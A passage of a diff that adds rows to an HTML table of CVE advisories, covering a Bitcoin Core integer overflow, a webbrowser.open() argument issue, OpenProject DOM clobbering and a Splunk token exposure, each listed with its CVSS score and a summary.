         <td>CWE-190</td>
         <td>&nbsp;</td>
         <td><details><summary>Bitcoin Core 0.13.0 through 29.x has an integer overflow.</summary><p>Bitcoin Core 0.13.0 through 29.x has an integer overflow.</p></details></td>
+        <td>2026-03-20</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4519" target="_blank" rel="noopener">CVE-2026-4519</a></td>
+        <td>7.0</td>
+        <td><span class="severity high">HIGH</span></td>
+        <td>N/A</td>
+        <td>&nbsp;</td>
+        <td><details><summary>The webbrowser.open() API would accept leading dashes in the URL which 
+could be...</summary><p>The webbrowser.open() API would accept leading dashes in the URL which 
+could be handled as command line options for certain web browsers. New 
+behavior rejects leading dashes. Users are recommended to sanitize URLs 
+prior to passing to webbrowser.open().</p></details></td>
         <td>2026-03-20</td>
       </tr>
       <tr>
@@ -20346,6 +20650,17 @@ Avoid direct `${{ ... }}` interpolation inside `run:` for any user-controlled va
         <td>CWE-79</td>
         <td>&nbsp;</td>
         <td><details><summary>OpenProject is an open-source, web-based project management software. Prior to 1...</summary><p>OpenProject is an open-source, web-based project management software. Prior to 17.2.0, this vulnerability occurs due to improper validation of OpenProject’s Markdown rendering, specifically in the hyperlink handling. This allows an attacker to inject malicious hyperlink payloads that perform DOM clobbering. DOM clobbering can crash or blank the entire page by overwriting native DOM functions with HTML elements, causing critical JavaScript calls to throw runtime errors during application initialization and halt further execution. This vulnerability is fixed in 17.2.0.</p></details></td>
+        <td>2026-03-11</td>
+      </tr>
+      <tr>
+        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-20166" target="_blank" rel="noopener">CVE-2026-20166</a></td>
+        <td>5.4</td>
+        <td><span class="severity medium">MEDIUM</span></td>
+        <td>CWE-200</td>
+        <td>&nbsp;</td>
+        <td><details><summary>In Splunk Enterprise versions below 10.2.1 and 10.0.4, and Splunk Cloud Platform...</summary><p>In Splunk Enterprise versions below 10.2.1 and 10.0.4, and Splunk Cloud Platform versions below 10.2.2510.5, 10.1.2507.16, and 10.0.2503.12, a low-privileged user that does not hold the &quot;admin&quot; or &quot;power&quot; Splunk roles could retrieve the Observability Cloud API access token through the Discover Splunk Observability Cloud app due to improper access control. 
+
+This vulnerability does not affect Splunk Enterprise versions below 9.4.9 and 9.3.10 because the Discover Splunk Observability Cloud app does not come with Splunk Enterprise.</p></details></td>
         <td>2026-03-11</td>
       </tr>
       <tr>
